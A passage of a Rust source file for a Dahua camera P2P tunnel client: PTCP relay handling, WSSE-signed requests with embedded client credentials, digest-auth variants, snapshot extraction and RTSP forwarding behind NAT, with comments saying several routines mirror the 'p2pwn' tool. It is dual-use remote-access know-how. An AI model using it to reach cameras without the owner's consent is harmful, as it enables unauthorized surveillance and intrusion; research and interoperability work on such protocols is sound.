        v.extend_from_slice(&[0xFF, 0xD9]);
        v
    }

    #[test]
    fn jpeg_stream_without_content_length_waits_for_eoi() {
        // This is the regression that made every snapshot a truncated file:
        // snapshot.cgi answers with `Connection: close` and no Content-Length,
        // so the read loop must keep going until the EOI marker arrives.
        let headers = "HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\nConnection: close\r\n";

        let partial = fake_jpeg(1500);
        let truncated = &partial[..1000];
        assert_eq!(
            classify_http_body(headers, truncated),
            HttpBodyEnd::KeepReading
        );

        let full = fake_jpeg(4000);
        assert_eq!(classify_http_body(headers, &full), HttpBodyEnd::Drain);
    }

    #[test]
    fn jpeg_stream_detected_from_magic_bytes_without_content_type() {
        let headers = "HTTP/1.1 200 OK\r\nConnection: close\r\n";
        let partial = &fake_jpeg(2000)[..900];
        assert_eq!(
            classify_http_body(headers, partial),
            HttpBodyEnd::KeepReading
        );
    }

    #[test]
    fn content_length_and_chunked_framing() {
        let cl = "HTTP/1.1 200 OK\r\nContent-Length: 5\r\n";
        assert_eq!(classify_http_body(cl, b"12345"), HttpBodyEnd::Complete);
        assert_eq!(classify_http_body(cl, b"123"), HttpBodyEnd::KeepReading);

        let chunked = "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n";
        assert_eq!(
            classify_http_body(chunked, b"5\r\nhello\r\n0\r\n\r\n"),
            HttpBodyEnd::Drain
        );
        assert_eq!(
            classify_http_body(chunked, b"5\r\nhel"),
            HttpBodyEnd::KeepReading
        );
    }

    #[test]
    fn unauthorized_response_does_not_block() {
        let h =
            "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Digest realm=\"Login to Dahua\"\r\n";
        assert_eq!(
            classify_http_body(h, b"<html>denied</html>"),
            HttpBodyEnd::Drain
        );
    }

    #[test]
    fn dechunk_reassembles_stream() {
        let body = b"4\r\nWiki\r\n5\r\npedia\r\n0\r\n\r\n";
        assert_eq!(dechunk_http(body), b"Wikipedia".to_vec());
        // Trailing garbage after the terminator is ignored.
        assert_eq!(dechunk_http(b"4\r\nWiki\r\n0\r\n\r\nXX"), b"Wiki".to_vec());
        // Not chunked → returned untouched.
        assert_eq!(
            dechunk_http(b"\xff\xd8\xffplain"),
            b"\xff\xd8\xffplain".to_vec()
        );
    }

    #[test]
    fn extract_jpeg_skips_leading_noise_and_rejects_truncated() {
        let jpeg = fake_jpeg(3000);
        let mut raw = b"HTTP/1.1 200 OK\r\n\r\n<garbage>".to_vec();
        raw.extend_from_slice(&jpeg);
        assert_eq!(extract_jpeg_from_http("", &raw), Some(jpeg.clone()));

        // SOI but no EOI → nothing usable.
        let truncated = raw[..raw.len() - 2].to_vec();
        assert_eq!(extract_jpeg_from_http("", &truncated), None);

        // An error page must never be mistaken for a snapshot.
        assert_eq!(
            extract_jpeg_from_http("", b"HTTP/1.1 401 Unauthorized\r\n\r\n<html>x</html>"),
            None
        );
    }

    #[test]
    fn valid_jpeg_requires_both_markers() {
        assert!(is_valid_jpeg(&fake_jpeg(5000)));
        // SOI only — the old 3-byte check would have accepted this.
        assert!(!is_valid_jpeg(&fake_jpeg(5000)[..4000]));
        // Too small to be a real frame.
        assert!(!is_valid_jpeg(&fake_jpeg(500)));
    }

    #[test]
    fn www_authenticate_parsed_and_ordered() {
        let h = concat!(
            "HTTP/1.1 401 Unauthorized\r\n",
            "WWW-Authenticate: Basic realm=\"Login to Dahua\"\r\n",
            "WWW-Authenticate: Digest realm=\"Login to 192.168.1.108\", nonce=\"a1b2c3\", qop=\"auth,auth-int\", opaque=\"op\"\r\n"
        );
        let ch = parse_www_authenticate(h);
        assert_eq!(ch.len(), 2);
        // Digest must come first.
        assert_eq!(ch[0].scheme, "digest");
        assert_eq!(ch[0].realm, "Login to 192.168.1.108");
        assert_eq!(ch[0].nonce, "a1b2c3");
        assert_eq!(ch[0].qop, "auth");
        assert_eq!(ch[0].opaque, "op");
        assert_eq!(ch[1].scheme, "basic");
        assert_eq!(ch[1].realm, "Login to Dahua");
    }

    #[test]
    fn digest_header_covers_case_and_uri_variants() {
        let ch = AuthChallenge {
            scheme: "digest".into(),
            realm: "Login to Dahua".into(),
            nonce: "abc".into(),
            qop: "auth".into(),
            opaque: String::new(),
        };
        let uri = "/cgi-bin/snapshot.cgi?action=snapshot&channel=1";
        let seen: Vec<String> = (0..4)
            .map(|v| build_digest_header("GET", uri, "admin", "pass", &ch, v).unwrap())
            .collect();
        // All four combinations differ: lowercase/uppercase HA1 x full/path URI.
        for i in 0..seen.len() {
            for j in (i + 1)..seen.len() {
                assert_ne!(seen[i], seen[j], "variant {i} and {j} collided");
            }
        }
        // The digest URI is the full request-URI for variant 0 and the bare
        // path for variant 3, and only qop builds send nc/cnonce.
        assert!(seen[0].contains(&format!("uri=\"{}\"", uri)));
        assert!(seen[0].contains("nc=00000001"));
        assert!(seen[3].contains("uri=\"/cgi-bin/snapshot.cgi\""));
        // No nonce → no digest possible.
        let mut bare = ch.clone();
        bare.nonce = String::new();
        assert!(build_digest_header("GET", uri, "admin", "pass", &bare, 0).is_none());
    }
}

// ---- Helpers ----

fn ip_to_bytes(addr: &str) -> Vec<u8> {
    let sock: SocketAddrV4 = addr.parse().expect("Invalid address");
    let ip = sock.ip().octets();
    let port = sock.port();
    let mut bytes = Vec::new();
    bytes.extend_from_slice(&port.to_be_bytes());
    bytes.extend_from_slice(&ip);
    bytes.iter().map(|b| !b).collect()
}

fn hexdump(bytes: &[u8]) -> String {
    bytes
        .iter()
        .take(192)
        .map(|b| format!("{:02x}", b))
        .collect::<Vec<_>>()
        .join(" ")
}

#[async_trait]
trait DhP2P {
    async fn dh_request(&self, path: &str, body: Option<&str>, seq: &mut u32)
        -> Result<(), String>;
    async fn dh_read_raw_timeout(&self, dur: Duration) -> DHResponse;
}

#[async_trait]
impl DhP2P for UdpSocket {
    async fn dh_request(
        &self,
        path: &str,
        body: Option<&str>,
        seq: &mut u32,
    ) -> Result<(), String> {
        let method = if body.is_some() { "DHPOST" } else { "DHGET" };
        let body_str = body.unwrap_or("");
        let nonce: u32 = rand::random();
        let currdate = Utc::now().to_rfc3339_opts(chrono::SecondsFormat::Secs, true);
        let pwd = format!("{}{}DHP2P:{}:{}", nonce, currdate, USERNAME, USERKEY);
        let digest =
            base64::engine::general_purpose::STANDARD.encode(sha1::Sha1::digest(pwd.as_bytes()));
        let x_pcs: String = {
            let r: u128 = rand::random();
            format!("{:032x}", r)
        };
        *seq += 1;
        let req = format!(
            "{} {} HTTP/1.1\r\n\
             X-Version: 6.7.2\r\n\
             x-pcs-request-id: {}\r\n\
             X-ToUType: Client/SmartPSS_Mac\r\n\
             CSeq: {}\r\n\
             Authorization: WSSE profile=\"UsernameToken\"\r\n\
             X-WSSE: UsernameToken Username=\"{}\", PasswordDigest=\"{}\", Nonce=\"{}\", Created=\"{}\"\r\n\r\n{}",
            method, path, x_pcs, seq, USERNAME, digest, nonce, currdate, body_str
        );
        self.send(req.as_bytes())
            .await
            .map_err(|e| format!("DH send error ({} {}): {}", method, path, e))?;
        Ok(())
    }

    async fn dh_read_raw_timeout(&self, dur: Duration) -> DHResponse {
        let mut buf = [0u8; 4096];
        match timeout(dur, self.recv(&mut buf)).await {
            Ok(Ok(n)) => {
                let res = String::from_utf8_lossy(&buf[..n]);
                if HTTP_DEBUG.load(Ordering::Relaxed) {
                    eprintln!("[debug] <<< raw: {}", res.replace("\r\n", "\\r\\n"));
                }
                DHResponse::parse_response(&res)
            }
            Ok(Err(e)) => DHResponse {
                code: 0,
                status: format!("recv error: {}", e),
                body: None,
            },
            Err(_) => DHResponse {
                code: 0,
                status: "timeout".to_string(),
                body: None,
            },
        }
    }
}

pub async fn wait_for_ptcp(
    sock: &UdpSocket,
    session: &Mutex<PTCPSession>,
    timeout_dur: Duration,
    realm_id: u32,
) -> Option<PTCPBody> {
    let deadline = tokio::time::Instant::now() + timeout_dur;
    let mut seen: Vec<(String, u32)> = Vec::new();

    loop {
        let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
        if remaining.is_zero() {
            if HTTP_DEBUG.load(Ordering::Relaxed) {
                eprintln!(
                    "[debug] wait_for_ptcp: timeout waiting for status realm={}; seen {} packets (realm/type): {:?}",
                    realm_id,
                    seen.len(),
                    seen
                );
            }
            return None;
        }

        let data = match udp_recv(sock, remaining).await {
            Some(d) => d,
            None => {
                if HTTP_DEBUG.load(Ordering::Relaxed) {
                    eprintln!(
                        "[debug] wait_for_ptcp: wait ended (recv timeout/closed) after {} packets: {:?}",
                        seen.len(),
                        seen
                    );
                }
                return None;
            }
        };
        if data.len() < 25 {
            if HTTP_DEBUG.load(Ordering::Relaxed) {
                eprintln!(
                    "[debug] wait_for_ptcp: short datagram ({} bytes) ignored",
                    data.len()
                );
            }
            continue;
        }
        let pkt = PTCPPacket::parse(&data);

        {
            let mut s = session.lock().await;
            s.recv(pkt);
        }

        let body = PTCPBody::parse(&data[24..]);
        let tag = match &body {
            PTCPBody::Payload(p) => format!("payload(r={})", p.realm),
            PTCPBody::Bind(r, p) => format!("bind(r={},p={})", r, p),
            PTCPBody::Status(r, s) => format!("status(r={},{})", r, s),
            PTCPBody::Heartbeat => "heartbeat".into(),
            PTCPBody::Empty => "empty".into(),
            PTCPBody::Sync => "sync".into(),
            PTCPBody::Command(_) => "command".into(),
        };
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            let body_hex = hexdump(&data[24..]);
            eprintln!(
                "[debug] wait_for_ptcp: recv {} ({} bytes) body={}",
                tag,
                data.len(),
                body_hex
            );
        }
        if seen.len() < 32 {
            seen.push((tag, data.len() as u32));
        }

        match &body {
            PTCPBody::Status(r, _) if *r == realm_id => {
                return Some(body);
            }
            PTCPBody::Empty => {
                let mut s = session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                continue;
            }
            PTCPBody::Sync => {
                // Reference relay clients acknowledge every non-empty packet
                // (including SYNs) with an empty ack, never a SYN reply.
                let mut s = session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                continue;
            }
            // Ack other stray non-empty packets (relayed "Server Nat Info!",
            // heartbeats, stale payloads) to keep the peer's flow open.
            _ => {
                let mut s = session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                continue;
            }
        }
    }
}

/// Bind to a remote port via PTCP and return realm_id.
pub async fn ptcp_bind(
    sock: &UdpSocket,
    session: &Mutex<PTCPSession>,
    remote_port: u16,
    timeout_dur: Duration,
) -> Option<u32> {
    let realm_id: u32 = rand::random();
    {
        let mut s = session.lock().await;
        udp_send(
            sock,
            &s.send(PTCPBody::Bind(realm_id, remote_port as u32))
                .serialize(),
        )
        .await;
    }

    let status = wait_for_ptcp(sock, session, timeout_dur, realm_id).await;
    if matches!(&status, Some(PTCPBody::Status(_, s)) if s == "CONN") {
        Some(realm_id)
    } else {
        let mut s = session.lock().await;
        udp_send(
            sock,
            &s.send(PTCPBody::Status(realm_id, "DISC".into()))
                .serialize(),
        )
        .await;
        None
    }
}

pub async fn ptcp_disconnect(sock: &UdpSocket, session: &Mutex<PTCPSession>, realm_id: u32) {
    {
        let mut s = session.lock().await;
        udp_send(
            sock,
            &s.send(PTCPBody::Status(realm_id, "DISC".into()))
                .serialize(),
        )
        .await;
    }
    // Wait for the device's 0x12 ack and reply with an empty ack (matching the
    // reference). Legacy devices otherwise keep the bound port held and refuse
    // a later re-bind of the same port.
    let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
    loop {
        let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
        if remaining.is_zero() {
            break;
        }
        match udp_recv(sock, remaining).await {
            Some(data) if data.len() >= 24 => {
                let pkt = PTCPPacket::parse(&data);
                {
                    let mut s = session.lock().await;
                    s.recv(pkt);
                }
                if let PTCPBody::Status(r, _) = PTCPBody::parse(&data[24..]) {
                    if r == realm_id {
                        let mut s = session.lock().await;
                        udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                        break;
                    }
                }
            }
            _ => break,
        }
    }
}

/// Read a single raw payload datagram for a realm (no DHIP framing).
/// Used by the raw SDK (37777) protocol exchanges.
pub async fn read_realm_single(
    sock: &UdpSocket,
    session: &Mutex<PTCPSession>,
    realm_id: u32,
    timeout_dur: Duration,
) -> Option<Vec<u8>> {
    let deadline = tokio::time::Instant::now() + timeout_dur;
    loop {
        let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
        if remaining.is_zero() {
            return None;
        }
        let raw = udp_recv(sock, remaining).await?;
        if raw.len() < 24 {
            continue;
        }
        let body = PTCPBody::parse(&raw[24..]);
        {
            let mut s = session.lock().await;
            let _ = s.recv(PTCPPacket::parse(&raw));
        }
        match &body {
            PTCPBody::Payload(p) if p.realm == realm_id => {
                let ack = {
                    let mut s = session.lock().await;
                    s.send(PTCPBody::Empty).serialize()
                };
                udp_send(sock, &ack).await;
                return Some(p.data.clone());
            }
            PTCPBody::Empty | PTCPBody::Heartbeat => {
                let mut s = session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                continue;
            }
            PTCPBody::Status(r, s) if *r == realm_id && s == "DISC" => {
                return None;
            }
            _ => continue,
        }
    }
}

/// Accumulate raw payload datagrams for a realm until a stall window with no
/// data elapses (sliding window) or the whole JPEG terminator is seen.
/// Mirrors p2pwn's readDataSkipDisc. Returns None if nothing was received.
pub async fn sdk_read_realm(
    sock: &UdpSocket,
    session: &Mutex<PTCPSession>,
    realm_id: u32,
    stall: Duration,
    max_total: Duration,
) -> Option<Vec<u8>> {
    let mut collected: Vec<u8> = Vec::new();
    let deadline = tokio::time::Instant::now() + max_total;

    loop {
        let now = tokio::time::Instant::now();
        if now >= deadline {
            return if collected.is_empty() {
                None
            } else {
                Some(collected)
            };
        }
        let win = stall.min(deadline - now);

        let raw = match udp_recv(sock, win).await {
            Some(r) => r,
            None => {
                return if collected.is_empty() {
                    None
                } else {
                    Some(collected)
                };
            }
        };
        if raw.len() < 24 {
            continue;
        }
        let body = PTCPBody::parse(&raw[24..]);
        {
            let mut s = session.lock().await;
            let _ = s.recv(PTCPPacket::parse(&raw));
        }
        match &body {
            PTCPBody::Payload(p) if p.realm == realm_id => {
                let ack = {
                    let mut s = session.lock().await;
                    s.send(PTCPBody::Empty).serialize()
                };
                udp_send(sock, &ack).await;
                collected.extend_from_slice(&p.data);
                if collected.windows(2).any(|w| w == [0xFF, 0xD9]) {
                    for _ in 0..6 {
                        let extra = udp_recv(sock, Duration::from_millis(50)).await;
                        let Some(extra) = extra else { break };
                        if extra.len() < 24 {
                            continue;
                        }
                        let eb = PTCPBody::parse(&extra[24..]);
                        {
                            let mut s = session.lock().await;
                            let _ = s.recv(PTCPPacket::parse(&extra));
                        }
                        if let PTCPBody::Payload(ep) = &eb {
                            if ep.realm == realm_id {
                                collected.extend_from_slice(&ep.data);
                            }
                        }
                    }
                    return Some(collected);
                }
            }
            PTCPBody::Empty | PTCPBody::Heartbeat => {
                let mut s = session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                continue;
            }
            PTCPBody::Status(r, s) if *r == realm_id && s == "DISC" => {
                return if collected.is_empty() {
                    None
                } else {
                    Some(collected)
                };
            }
            _ => continue,
        }
    }
}

/// Bidirectional byte relay between a TCP connection and one PTCP realm bound
/// to a device port. Mirrors p2pwn's `ForwardToLocal` (forward.go) and lets the
/// existing RTSP/MJPEG client run against `127.0.0.1:<local_port>` while the
/// bytes travel through the PTCP tunnel — so RTSP works on devices whose media
/// port is not reachable from the public IP (NAT). Implemented inline so that
/// only this task reads from the shared UDP socket (both halves share it).
///
/// Returns on TCP EOF, a device DISC, or when the whole relay has been idle for
/// `idle_stall` (sliding window, like `sdk_read_realm`).
pub async fn rtsp_forward_realm(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    local: TcpStream,
    idle_stall: Duration,
) {
    let (mut rd, mut wr) = tokio::io::split(local);
    let mut last_activity = tokio::time::Instant::now();
    let mut buf = [0u8; 8192];
    loop {
        let remaining =
            (last_activity + idle_stall).saturating_duration_since(tokio::time::Instant::now());
        if remaining.is_zero() {
            break;
        }
        let read_arm = rd.read(&mut buf);
        tokio::pin!(read_arm);
        let recv_arm = async { udp_recv(sock, remaining).await };
        tokio::pin!(recv_arm);

        tokio::select! {
            n = read_arm => match n {
                Ok(0) => break,
                Ok(n) => {
                    let data = buf[..n].to_vec();
                    let mut s = pcp_session.lock().await;
                    udp_send(
                        sock,
                        &s.send(PTCPBody::Payload(PTCPPayload {
                            realm: realm_id,
                            data,
                        }))
                        .serialize(),
                    )
                    .await;
                    last_activity = tokio::time::Instant::now();
                }
                Err(_) => break,
            },
            raw = recv_arm => {
                let Some(raw) = raw else { continue };
                if raw.len() < 25 {
                    continue;
                }
                let body = PTCPBody::parse(&raw[24..]);
                {
                    let mut s = pcp_session.lock().await;
                    let _ = s.recv(PTCPPacket::parse(&raw));
                }
                let ack = {
                    let mut s = pcp_session.lock().await;
                    s.send(PTCPBody::Empty).serialize()
                };
                match &body {
                    PTCPBody::Payload(p) if p.realm == realm_id => {
                        udp_send(sock, &ack).await;
                        if wr.write_all(&p.data).await.is_err() {
                            break;
                        }
                        last_activity = tokio::time::Instant::now();
                    }
                    PTCPBody::Empty | PTCPBody::Heartbeat => udp_send(sock, &ack).await,
                    PTCPBody::Status(r, st) if *r == realm_id && st == "DISC" => break,
                    _ => {}
                }
            }
        }
    }
}

// ---- HTTP/RPC2 Protocol ----

// ---- HTTP response framing (mirror core/p2p/tunnel.go) ----

/// How to terminate the read loop for an in-progress HTTP response.
#[derive(Debug, PartialEq)]
enum HttpBodyEnd {
    /// Framing satisfied — return now.
    Complete,
    /// A terminator marker is already present: pull in the few datagrams
    /// still in flight, then return.
    Drain,
    /// Nothing conclusive yet — keep reading until the deadline.
    KeepReading,
}

fn parse_content_length(headers: &str) -> Option<usize> {
    headers
        .lines()
        .find(|l| l.to_ascii_lowercase().starts_with("content-length:"))
        .and_then(|l| l.split(':').nth(1))
        .and_then(|s| s.trim().parse::<usize>().ok())
}

fn body_contains(body: &[u8], needles: &[&[u8]]) -> bool {
    needles.iter().any(|n| find_bytes(body, n).is_some())
}

/// Stall (per-datagram activity window) used once HTTP headers exist and the
/// body framing says more data is coming. Dahua DVRs stream `snapshot.cgi`
/// JPEGs on demand and can pause several seconds between datagrams; a short
/// window truncated a 9112-byte frame at 2205 bytes on `7F00CB6PAZ3FC73` and
/// then left the device's web server wedged for every later bind. Overridable
/// with `DAHUA_BODY_S` (seconds).
fn http_body_stall() -> Duration {
    std::env::var("DAHUA_BODY_S")
        .ok()
        .and_then(|v| v.trim().parse::<u64>().ok())
        .map(Duration::from_secs)
        .unwrap_or(Duration::from_secs(20))
}

/// Decide whether the accumulated response is complete.
///
/// Mirrors `DoHTTPOnRealm` (tunnel.go:591). The case that matters for us is
/// the JPEG stream: Dahua's `snapshot.cgi` answers with `Connection: close`
/// and **no** `Content-Length`, so the only reliable terminator is the EOI
/// marker `FF D9`. Returning on the first datagram saves a truncated image.
fn classify_http_body(headers: &str, body: &[u8]) -> HttpBodyEnd {
    let lower = headers.to_ascii_lowercase();

    if lower.contains("transfer-encoding: chunked") {
        return if body.ends_with(b"0\r\n\r\n") || find_bytes(body, b"\r\n0\r\n\r\n").is_some() {
            HttpBodyEnd::Drain
        } else {
            HttpBodyEnd::KeepReading
        };
    }

    if let Some(len) = parse_content_length(headers) {
        return if body.len() >= len {
            HttpBodyEnd::Complete
        } else {
            HttpBodyEnd::KeepReading
        };
    }

    if lower.contains("image/jpeg") || body.starts_with(&[0xFF, 0xD8]) {
        return if find_bytes(body, &[0xFF, 0xD9]).is_some() {
            HttpBodyEnd::Drain
        } else {
            HttpBodyEnd::KeepReading
        };
    }

    if lower.contains("401 unauthorized")
        || lower.contains("403 forbidden")
        || lower.contains("404 not found")
        || lower.contains("400 bad request")
        || lower.contains("500 internal server error")
        || lower.contains("text/")
        || lower.contains("application/")
        || body_contains(
            body,
            &[
                b"<html",
                b"Error",
                b"table.",
                b"users[",
                b"user.Name=",
                b"result",
                b"version=",
                b"type=",
            ],
        )
    {
        return HttpBodyEnd::Drain;
    }

    HttpBodyEnd::KeepReading
}

/// Undo `Transfer-Encoding: chunked` framing. Returns the input unchanged when
/// it does not parse as chunks. Mirrors `DechunkHTTP` (tunnel.go:1604).
pub fn dechunk_http(data: &[u8]) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::new();
    let mut rest = data;
    while !rest.is_empty() {
        let Some(idx) = find_bytes(rest, b"\r\n") else {
            break;
        };
        let mut hex_str = String::from_utf8_lossy(&rest[..idx]).trim().to_string();
        if let Some(ext) = hex_str.find(';') {
            hex_str.truncate(ext);
        }
        let Ok(size) = usize::from_str_radix(hex_str.trim(), 16) else {
            return data.to_vec();
        };
        if size == 0 {
            break;
        }
        rest = &rest[idx + 2..];
        if rest.len() < size {
            out.extend_from_slice(rest);
            break;
        }
        out.extend_from_slice(&rest[..size]);
        rest = &rest[size..];
        if rest.starts_with(b"\r\n") {
            rest = &rest[2..];
        }
    }
    if out.is_empty() {
        data.to_vec()
    } else {
        out
    }
}

/// Pull a whole JPEG out of a raw HTTP response. Mirrors `ExtractJPEG`
/// (tunnel.go:1492): first `FF D8` after the headers, then the matching
/// `FF D9`.
pub fn extract_jpeg_from_http(headers: &str, body: &[u8]) -> Option<Vec<u8>> {
    let body = if headers
        .to_ascii_lowercase()
        .contains("transfer-encoding: chunked")
    {
        dechunk_http(body)
    } else {
        body.to_vec()
    };

    let mut off = 0usize;
    while off + 1 < body.len() {
        let Some(rel) = find_bytes(&body[off..], &[0xFF, 0xD8]) else {
            break;
        };
        let soi = off + rel;
        let Some(eoi_rel) = find_bytes(&body[soi + 2..], &[0xFF, 0xD9]) else {
            break;
        };
        let candidate = &body[soi..soi + 2 + eoi_rel + 2];
        if candidate.len() >= 1000 {
            return Some(candidate.to_vec());
        }
        off = soi + 2;
    }
    None
}

/// A response counts as a snapshot only when it carries **both** the SOI and
/// the EOI marker. The previous 3-byte magic check accepted truncated images.
pub fn is_valid_jpeg(data: &[u8]) -> bool {
    data.len() >= 1000
        && data[0] == 0xFF
        && data[1] == 0xD8
        && data[data.len() - 2] == 0xFF
        && data[data.len() - 1] == 0xD9
}

// ---- HTTP auth challenges (mirror core/p2p/tunnel.go) ----

/// One `WWW-Authenticate` challenge from a 401 response.
#[derive(Debug, Clone, Default)]
pub struct AuthChallenge {
    pub scheme: String,
    pub realm: String,
    pub nonce: String,
    pub qop: String,
    pub opaque: String,
}

fn split_auth_params(params: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut in_quotes = false;
    for c in params.chars() {
        match c {
            '"' => {
                in_quotes = !in_quotes;
                cur.push(c);
            }
            ',' if !in_quotes => out.push(std::mem::take(&mut cur)),
            _ => cur.push(c),
        }
    }
    if !cur.trim().is_empty() {
        out.push(cur);
    }
    out
}

fn strip_auth_value<'a>(part: &'a str, key: &str) -> Option<&'a str> {
    let (k, v) = part.split_once('=')?;
    if !k.trim().eq_ignore_ascii_case(key) {
        return None;
    }
    Some(v.trim().trim_matches('"'))
}

/// Parse every `WWW-Authenticate` header, ordered by the Digest > Basic >
/// WSSE preference of `selectAuthHeaderVariant` (tunnel.go:1318).
pub fn parse_www_authenticate(headers: &str) -> Vec<AuthChallenge> {
    let mut out: Vec<AuthChallenge> = Vec::new();
    for line in headers.lines() {
        if !line.to_ascii_lowercase().starts_with("www-authenticate:") {
            continue;
        }
        let raw = line["www-authenticate:".len()..].trim();
        if raw.is_empty() {
            continue;
        }
        let (scheme, params) = match raw.find(' ') {
            Some(i) => (raw[..i].to_ascii_lowercase(), &raw[i + 1..]),
            None => (raw.to_ascii_lowercase(), ""),
        };
        let mut ch = AuthChallenge {
            scheme,
            ..Default::default()
        };
        for part in split_auth_params(params) {
            if let Some(v) = strip_auth_value(&part, "realm") {
                ch.realm = v.to_string();
            } else if let Some(v) = strip_auth_value(&part, "nonce") {
                ch.nonce = v.to_string();
            } else if let Some(v) = strip_auth_value(&part, "qop") {
                ch.qop = v
                    .split(',')
                    .next()
                    .unwrap_or("")
                    .trim()
                    .trim_matches('"')
                    .to_string();
            } else if let Some(v) = strip_auth_value(&part, "opaque") {
                ch.opaque = v.to_string();
            }
        }
        out.push(ch);
    }
    out.sort_by_key(|c| match c.scheme.as_str() {
        "digest" => 0,
        "basic" => 1,
        "wsse" => 2,
        _ => 3,
    });
    out
}

fn md5_hex_lower(s: &str) -> String {
    format!("{:x}", md5::compute(s.as_bytes()))
}

fn md5_hex_upper(s: &str) -> String {
    format!("{:X}", md5::compute(s.as_bytes()))
}

/// Build an `Authorization: Digest` header. Mirrors `digestAuthHeaderVariant`
/// (tunnel.go:1360). Dahua firmware is split between lowercase and uppercase
/// MD5 HA1 and between a digest URI that keeps the query string and one that
/// does not, so the variant is selectable and all four are tried.
pub fn build_digest_header(
    method: &str,
    uri: &str,
    user: &str,
    password: &str,
    ch: &AuthChallenge,
    variant: usize,
) -> Option<String> {
    if ch.nonce.is_empty() {
        return None;
    }
    let path_only = uri.split('?').next().unwrap_or(uri);
    let ha1_source = format!("{}:{}:{}", user, ch.realm, password);
    let (ha1, target_uri) = match variant {
        1 => (md5_hex_upper(&ha1_source), uri),
        2 => (md5_hex_upper(&ha1_source), path_only),
        3 => (md5_hex_lower(&ha1_source), path_only),
        _ => (md5_hex_lower(&ha1_source), uri),
    };
    let ha2 = md5_hex_lower(&format!("{}:{}", method, target_uri));
    let nc = "00000001";
    let cnonce = format!("{:08x}", rand::random::<u32>());

    let response = if ch.qop.is_empty() {
        md5_hex_lower(&format!("{}:{}:{}", ha1, ch.nonce, ha2))
    } else {
        md5_hex_lower(&format!(
            "{}:{}:{}:{}:{}:{}",
            ha1, ch.nonce, nc, cnonce, ch.qop, ha2
        ))
    };

    let mut h = format!(
        "Authorization: Digest username=\"{}\", realm=\"{}\", nonce=\"{}\", uri=\"{}\", response=\"{}\"",
        user, ch.realm, ch.nonce, target_uri, response
    );
    if !ch.opaque.is_empty() {
        h.push_str(&format!(", opaque=\"{}\"", ch.opaque));
    }
    if !ch.qop.is_empty() {
        h.push_str(&format!(
            ", qop={}, nc={}, cnonce=\"{}\"",
            ch.qop, nc, cnonce
        ));
    }
    Some(h)
}

fn build_wsse_header(user: &str, password: &str) -> String {
    let nonce = format!("{:x}", rand::random::<u32>());
    let created = chrono::Utc::now().format("%Y-%m-%dT%H:%M:%SZ").to_string();
    let digest = {
        use base64::Engine;
        let mut h = sha1::Sha1::new();
        sha1::Digest::update(
            &mut h,
            format!("{}{}{}", nonce, created, password).as_bytes(),
        );
        base64::engine::general_purpose::STANDARD.encode(sha1::Digest::finalize(h))
    };
    format!(
        "Authorization: WSSE profile=\"UsernameToken\"\r\nX-WSSE: UsernameToken Username=\"{}\", PasswordDigest=\"{}\", Nonce=\"{}\", Created=\"{}\"",
        user, digest, nonce, created
    )
}

/// Fire-and-forget realm teardown. `ptcp_disconnect` waits up to 5 s for the
/// device ack — right for the one-shot DHIP channel, far too slow for the
/// per-request realms of the HTTP path (p2pwn waits 50 ms, tunnel.go:317).
pub async fn ptcp_disconnect_quick(sock: &UdpSocket, session: &Mutex<PTCPSession>, realm_id: u32) {
    {
        let mut s = session.lock().await;
        udp_send(
            sock,
            &s.send(PTCPBody::Status(realm_id, "DISC".into()))
                .serialize(),
        )
        .await;
    }
    let deadline = tokio::time::Instant::now() + Duration::from_millis(150);
    loop {
        let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
        if remaining.is_zero() {
            break;
        }
        let Some(data) = udp_recv(sock, remaining).await else {
            break;
        };
        if data.len() < 25 {
            continue;
        }
        {
            let mut s = session.lock().await;
            let _ = s.recv(PTCPPacket::parse(&data));
        }
        if let PTCPBody::Status(r, _) = PTCPBody::parse(&data[24..]) {
            if r == realm_id {
                let mut s = session.lock().await;
                udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
                break;
            }
        }
    }
}

/// After a terminator marker (JPEG EOI, chunked trailer) pull in the datagrams
/// still in flight so the body is complete.
async fn drain_realm_tail(
    sock: &UdpSocket,
    session: &Mutex<PTCPSession>,
    realm_id: u32,
    buf: &mut Vec<u8>,
    rounds: usize,
) {
    for _ in 0..rounds {
        let Some(raw) = udp_recv(sock, Duration::from_millis(60)).await else {
            break;
        };
        if raw.len() < 25 {
            continue;
        }
        let body_type = PTCPBody::parse(&raw[24..]);
        {
            let mut s = session.lock().await;
            let _ = s.recv(PTCPPacket::parse(&raw));
        }
        let ack = {
            let mut s = session.lock().await;
            s.send(PTCPBody::Empty).serialize()
        };
        match &body_type {
            PTCPBody::Payload(p) if p.realm == realm_id => {
                udp_send(sock, &ack).await;
                buf.extend_from_slice(&p.data);
            }
            PTCPBody::Empty => udp_send(sock, &ack).await,
            _ => {}
        }
    }
}

/// One HTTP exchange on an already-bound realm. Accumulates payload datagrams
/// until the response is framed (see `classify_http_body`).
pub async fn http_exchange_on_realm(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    http_request: &str,
    timeout: Duration,
) -> Option<(String, Vec<u8>)> {
    LAST_CALL_DISC.store(false, Ordering::Relaxed);

    {
        let mut ps = pcp_session.lock().await;
        udp_send(
            sock,
            &ps.send(PTCPBody::Payload(PTCPPayload {
                realm: realm_id,
                data: http_request.as_bytes().to_vec(),
            }))
            .serialize(),
        )
        .await;
    }

    let deadline = tokio::time::Instant::now() + timeout;
    let mut buf: Vec<u8> = Vec::new();
    let mut last_activity = tokio::time::Instant::now();
    let mut have_headers = false;
    let mut body_offset = 0usize;
    let mut headers = String::new();
    let mut chunked = false;
